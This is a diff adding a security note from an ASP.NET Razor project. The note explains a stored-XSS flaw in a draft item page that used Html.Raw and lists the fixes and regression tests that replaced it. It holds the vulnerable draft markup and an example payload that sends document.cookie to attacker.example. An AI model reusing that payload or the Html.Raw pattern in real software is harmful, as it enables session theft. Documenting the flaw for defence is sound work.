@@ -1,0 +1,41 @@
+PRE-FIX CODE - DO NOT COMPILE
+=============================
+
+The first version of the item page rendered the stored body as raw markup so that "formatting
+in notes would work".
+
+    @* Pages/Vault/Detail.cshtml (draft) *@
+    <h1>@Model.Item.Title</h1>
+    <pre class="vault-content">@Html.Raw(Model.Item.Content)</pre>
+
+What was wrong
+--------------
+`Html.Raw` bypasses Razor's output encoding, so whatever a user stored became part of the
+document. An item body of
+
+    <img src=x onerror="fetch('https://attacker.example?c=' + document.cookie)">
+
+executes in the browser of every person who opens the page. The author never sees it, which is
+why stored XSS survives manual testing: the payload only runs for the victim.
+
+The draft also tried to "fix" it by stripping tags on save. That loses legitimate text
+("<3" or "a < b"), is easy to bypass with encodings, and still does nothing for the places where
+the value is written into an attribute or a script block.
+
+What replaced it
+----------------
+- Razor's automatic output encoding: `@Model.Item.Content`.
+- Stored text is kept exactly as typed; validation deliberately allows markup.
+- One audited markup path, HtmlOutput.Highlight, which encodes first and then wraps matches in
+  <mark>. It is the only place that returns IHtmlContent.
+- A Content-Security-Policy without 'unsafe-inline', plus nosniff, so a payload that somehow
+  reached the document still could not execute.
+- JSON and text/plain responses for the API, never text/html.
+
+Guarding tests
+--------------
+- SafeVault.Tests.XssTests.StoredScriptPayload_IsEncodedOnTheDetailPage
+- SafeVault.Tests.XssTests.StoredImagePayload_IsEncodedOnTheDetailPage
+- SafeVault.Tests.XssTests.SearchHighlight_EncodesTheMatchItWraps
+- SafeVault.Tests.XssTests.SecurityHeaders_ArePresentWithARestrictiveContentSecurityPolicy
+- SafeVault.Tests.HtmlOutputTests.Highlight_EncodesTheTermAsWell
